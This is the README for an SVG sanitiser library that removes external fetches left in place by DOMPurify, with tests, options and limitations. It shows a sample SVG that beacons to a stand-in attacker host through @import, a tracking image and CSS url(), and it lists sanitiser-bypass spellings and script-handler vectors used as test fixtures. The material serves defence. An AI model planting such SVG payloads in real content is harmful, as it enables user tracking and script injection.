# svg-sanitize-strict

DOMPurify's SVG profile, plus the rule it leaves out: **nothing in the output may make the browser fetch anything.**

`sanitizeSvg(input, options?) → SVGSVGElement`. One function, three options, one peer dependency (DOMPurify). Works in any browser; in Node with a jsdom window.

## The problem

DOMPurify is excellent at what it sets out to do: `<script>`, `on*` handlers and `javascript:` URIs do not survive its `svg` profile. But it does not police *where an SVG loads resources from*, so a "sanitised" SVG can still call home the moment it is rendered — through `<image href>`, `<use href>`, `<feImage href>`, `@import`, or a CSS `url()` in a `<style>` block, a `style=""` attribute, or a plain `fill="url(…)"`.

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
  <style>@import url("https://attacker.invalid/steal.css");</style>
  <image href="https://attacker.invalid/track.png?id=42" width="64" height="64"/>
  <use href="https://attacker.invalid/sprite.svg#icon"/>
  <rect width="64" height="64" fill="url(https://attacker.invalid/paint.svg#g)"/>
</svg>
```

After `DOMPurify.sanitize(svg, { USE_PROFILES: { svg: true, svgFilters: true }, ADD_TAGS: ["use"] })` — every reference is still there:

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
  <style>@import url("https://attacker.invalid/steal.css");</style>
  <image href="https://attacker.invalid/track.png?id=42" width="64" height="64"></image>
  <use href="https://attacker.invalid/sprite.svg#icon"></use>
  <rect width="64" height="64" fill="url(https://attacker.invalid/paint.svg#g)"></rect>
</svg>
```

After `sanitizeSvg(svg)`:

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
  <style/>
  <image width="64" height="64"/>
  <use/>
  <rect width="64" height="64" fill="none"/>
</svg>
```

Rendered in Chromium, the first output makes four requests to `attacker.invalid` (a tracking pixel with your user's id, a stylesheet, an external document for `<use>`, and — in Chromium — a fetch for the paint server). The second makes none. This is not a bug in DOMPurify; it is outside its scope. This package is the missing layer, and the test suite is the proof.

## Install

Not published to npm — install straight from GitHub:

```sh
npm install github:garagemade/svg-sanitize-strict dompurify
```

DOMPurify `^3.2.0` is a peer dependency.

Pin to a tag for reproducible builds:

```sh
npm install github:garagemade/svg-sanitize-strict#v0.1.0 dompurify
```

## Use

```ts
import { sanitizeSvg } from "svg-sanitize-strict";

// From an untrusted string: parsed as image/svg+xml into an inert document,
// cleaned there, returned as the <svg> element. Nothing fetched, nothing ran.
const clean = sanitizeSvg(untrustedSvgText);

// Put it on the page (appendChild adopts it into your document) …
container.replaceChildren(clean);

// … or keep it as text.
const text = new XMLSerializer().serializeToString(clean);
```

Invalid input throws an `SvgSanitizeError` with a `code` you can branch on:

```ts
import { sanitizeSvg, SvgSanitizeError } from "svg-sanitize-strict";

try {
  container.replaceChildren(sanitizeSvg(text));
} catch (e) {
  if (e instanceof SvgSanitizeError) {
    // e.code: "malformed" (not well-formed XML), "not-svg" (root is not an
    // <svg xmlns="http://www.w3.org/2000/svg">), "unsupported" (no DOM here)
  }
}
```

Node, for example to clean uploads before storing them:

```ts
import { JSDOM } from "jsdom";
import { sanitizeSvg } from "svg-sanitize-strict";

const { window } = new JSDOM("");
const clean = sanitizeSvg(svgText, { window });
const safeText = new window.XMLSerializer().serializeToString(clean);
```

You can also pass an element you have already parsed into an inert document (`DOMParser`); it is cleaned in place and returned. Do not pass an untrusted tree that is already live in the page — by then it has had its chance to run.

## Options

| Option | Default | What it does |
| --- | --- | --- |
| `allowStyleElement` | `true` | Keep `<style>` elements. Their CSS is scrubbed of `@import` and external `url()` and otherwise left untouched, because Illustrator and Figma exports rely on `<style>.cls-1{fill:…}</style>` + `class`. `style=""` attributes are kept (and scrubbed) regardless. |
| `allowUse` | `true` | Keep `<use>`. Only same-document `#fragment` references survive on it either way — never a URL, never a `data:` payload. |
| `allowDataImages` | `true` | Keep `data:image/*` in `<image>` and CSS `url()`. SVG loaded through `<image>` is a non-scripted, non-fetching context, so this is safe. Set `false` to have the output reference nothing at all. |
| `window` | global `window` | The DOM implementation to use. Pass a jsdom window in Node. |

The defaults are the behaviour of the editor this was extracted from.

## What is stripped, what survives

| | Stripped | Survives |
| --- | --- | --- |
| **Script** | `<script>` (inline and `href`), every `on*` attribute in any spelling, `javascript:`/`vbscript:` in any `href`/`xlink:href` — DOMPurify's job | — |
| **HTML islands** | `<foreignObject>` and everything inside it | — |
| **`href` / `xlink:href`** on `<image>`, `<a>`, `<feImage>`, `<textPath>`, gradients, patterns, filters… | `http(s):`, `//host`, `/root-relative`, `relative.svg`, `data:` that is not `data:image/*` | `#fragment`; `data:image/*` on `<image>` (with `allowDataImages`) |
| **`<use>`** | Any `href` that is not `#fragment`, including `data:` | `<use href="#symbol">`, `xlink:href="#symbol"` |
| **`<style>` text** | `@import` in any spelling (`@\69 mport`, `@\i\m\p\o\r\t`…), `url()`/`src()` to anything external, bare-string URLs in `image-set()`/`image()`, `@font-face` sources | Every other rule, byte-for-byte: selectors, `class` rules, `url(#gradient)`, `url(data:image/…)` |
| **`style=""` and presentation attributes** (`fill`, `stroke`, `filter`, `mask`, `clip-path`, `marker-*`, `cursor`…) | External `url()`, including escaped spellings (`u\72 l(`) → replaced with `none` | Everything else, byte-for-byte: `fill="url(#g)"`, `style="filter:url(#f)"` |
| **SMIL** | `<animate>` and `<set>` (DOMPurify's profile — they can retarget `href`) | `<animateTransform>`, `<animateMotion>`, `<mpath href="#p">` with their `from`/`to`/`values`/`dur`… |
| **Structure** | Processing instructions (`<?xml-stylesheet?>`), comments, CDATA wrappers (their text is kept), editor namespaces (`inkscape:`, `sodipodi:`, RDF metadata), attributes outside the SVG allow-list (`enable-background`, `xml:lang`) | `<defs>`, gradients + `<stop>`, `<pattern>`, `<mask>`, `<clipPath>`, `<filter>` + primitives, `<marker>`, `<symbol>`, `<text>`/`<tspan>`/`<textPath>`, `<title>`/`<desc>`, `viewBox`, `preserveAspectRatio`, `transform`, `class`, `id` (any id — SVG cannot DOM-clobber), `role`, `aria-*`, `data-*`, `xml:space`, `xmlns:xlink` |

"Stripped" means the *reference* is removed. The element stays, empty and harmless: `<image href="https://…">` becomes `<image>`, `fill="url(https://…)"` becomes `fill="none"`. Nothing that was clean is rewritten — a `<style>` block or `style=""` that reaches nowhere comes back byte-for-byte. Only a stylesheet that actually reached off-document is re-serialised through the browser's CSS parser (so `#2849ff` may come back as `rgb(40, 73, 255)` in that one file).

## The proof

`npm test` runs 125 tests under jsdom. The interesting ones:

**28 attack fixtures** ([`test/fixtures/attacks/`](test/fixtures/attacks)). The first sixteen are the cases from the security audit of [svg.garagemade.app](https://svg.garagemade.app), each observed executing or beaconing in a browser before the sanitiser existed; the rest are extra spellings of the same holes. Every fixture carries two canaries — `attacker.invalid` on anything that would fetch, `EXEC_CANARY` on anything that would run — and each is checked three ways: an independent walker finds nothing left in the output that could run or fetch; neither canary survives serialisation; and a fixture-specific assertion states exactly what happened to it.

| # | Fixture | # | Fixture |
| --- | --- | --- | --- |
| 01 | inline `<script>` and `<script href>` | 15 | `style="fill:url(https://…)"` |
| 02 | `<svg onload>` | 16 | `@\69 mport` and other escaped `@import` |
| 03 | `<image onerror>` / `onload` | 17 | `<use href="data:image/svg+xml,…#x">` |
| 04 | `onmouseover`, `onclick`, `onfocusin` | 18 | `xlink:href` externals, `ftp:`, `//host` |
| 05 | `<animate onbegin>`, `<animate attributeName="href">` | 19 | `fill`/`stroke`/`filter`/`mask`/`clip-path`/`marker-end="url(https://…)"` |
| 06 | `<set onbegin>` | 20 | `u\72 l(` in `style=""` and `fill` |
| 07 | `<foreignObject>` with `<img onerror>`, `<iframe>` | 21 | `image-set("https://…")` bare-string URLs |
| 08 | `<a href="javascript:">` in four encodings | 22 | `<?xml-stylesheet href=…?>` |
| 09 | `<image xlink:href="javascript:">` | 23 | `<a xlink:href="javascript:">` |
| 10 | `<image href="https://…">` | 24 | handlers on `<animateTransform>`/`<animateMotion>`, `ONLOAD` casing |
| 11 | `<use href="https://…">` | 25 | XXE external entity |
| 12 | `<feImage href="https://…">` | 26 | `<image href="data:text/html,…">` |
| 13 | `<style>@import` | 27 | relative `<use>`/`<image>` URLs |
| 14 | `<style>` `url()` in `fill`, `background-image`, `cursor` | 28 | `@font-face { src: url(https://…) }` |

**The inverse.** The nine sample artworks bundled with svg.garagemade.app — gradients with stops, `<defs>`, transforms, even-odd paths, dashed strokes — serialise **byte-for-byte identically** after sanitising ([`test/fixtures/samples/`](test/fixtures/samples)). So do exporter idioms in [`test/fixtures/legit/`](test/fixtures/legit): Illustrator's `<style><![CDATA[…]]></style>`, Figma's `<style>` + `class` + `clip-path="url(#id)"`, Inkscape's `style=""` declaration lists, `<use href="#symbol">` in both href forms, gradient inheritance, markers, masks, patterns, `textPath`, `data:image` in `<image>` and CSS, and an accessible `<animateTransform>` spinner with `role`, `aria-labelledby`, `from`/`to`.

**The motivation, as a test.** [`test/motivation.test.ts`](test/motivation.test.ts) runs the example above through real DOMPurify and asserts the references *are* kept, so the opening claim of this README is re-checked on every run and fails loudly if DOMPurify ever changes.

**In a real browser.** jsdom cannot fetch or execute, so [`test/browser/run.py`](test/browser/run.py) mounts the same fixtures in headless Chromium (Playwright) and counts what actually happens:

```
Chromium 151 — constructable stylesheets (CSSOM path): True

== RAW (control) ==       28/28 fixtures mounted
  requests off-origin:   30
  EXEC_CANARY calls:     7

== SANITISED ==
  28/28 inert · 9/9 samples byte-identical · 6/7 exporter fixtures byte-identical (Illustrator: CDATA→text, comment dropped)
  requests off-origin:   0
  EXEC_CANARY calls:     0
```

Run it yourself with `pip install playwright && playwright install chromium`, then `npm run build && python test/browser/run.py`.

## Limitations — read these

This is **defence in depth**, not a substitute for a Content Security Policy. Ship both. A CSP that stops an inline SVG from fetching or running anything it should not:

```
Content-Security-Policy: default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'
```

Things this library does not do, or does with a caveat:

- **`<style>` scope.** CSS in an inline `<svg>` applies to the *whole document*, not the SVG. A sanitised `<style>` cannot exfiltrate (no `url()`, no `@import`), but it can still restyle your page (`body{display:none}`). If that matters, pass `allowStyleElement: false`, or render untrusted SVGs in an `<img>`, an `<iframe sandbox>`, or a shadow root.
- **`<a href="#…">` only.** External links (`https:`, `mailto:`…) are removed along with everything else that leaves the document. A clickable-diagram use case would need an option this package does not yet have.
- **SMIL `<animate>`/`<set>` are dropped** (DOMPurify's svg profile). `<animateTransform>` and `<animateMotion>` survive.
- **`<feImage>` accepts `#fragment` only**; a `data:` image on `<feImage>` is dropped (DOMPurify's data-URI allow-list does not include it).
- **Webfonts and `data:font/*` are dropped** — `@font-face { src: url(…) }` is a fetch like any other.
- **CSS is scrubbed by a scanner, not a full CSS parser.** In browsers with constructable stylesheets, a `<style>` that reaches out is first normalised through the browser's own parser, so escape tricks resolve exactly as the browser would resolve them. Elsewhere (Node/jsdom, old Safari) a textual pass unescapes and re-checks up to three times and drops the sheet entirely if it still cannot vouch for it. Presentation attributes and `style=""` always use the textual pass. It fails closed: anything that *looks* like `url(` is treated as one.
- **XML entity expansion.** Parsing is the browser's XML parser. Browsers do not resolve external entities (fixture 25 confirms no request is made), and they cap internal expansion, but this package adds no protection of its own against entity-expansion DoS.
- **Output size and rendering cost** are not limited. A 50 MB path or a filter chain that takes seconds to rasterise is still valid, inert SVG.
- **Only the SVG namespace.** Input must be well-formed XML with `<svg xmlns="http://www.w3.org/2000/svg">` as the root — the way every real `.svg` file is written. HTML-flavoured SVG fragments (`<svg><path></svg>` without the namespace) are rejected with `not-svg` rather than guessed at.
- **Browser support** is anything that runs DOMPurify 3 (`DOMParser`, `NodeIterator`). The CSSOM path additionally needs `CSSStyleSheet.prototype.replaceSync` (Chrome 73, Firefox 101, Safari 16.4); older engines use the textual pass.

Verified in Chromium. Not yet verified against Firefox's external-resource loading for `fill`/`filter`/`mask` — those references are stripped regardless.

## Origin

This is the input-boundary sanitiser from [svg.garagemade.app](https://svg.garagemade.app), a browser-only SVG editor where every file loaded, restored from history or restored from the session goes through exactly this before it touches the canvas. It was extracted so it could be tested in the open and dropped into other projects. The app's behaviour is the default behaviour here.

## Licence

[MIT](LICENSE).
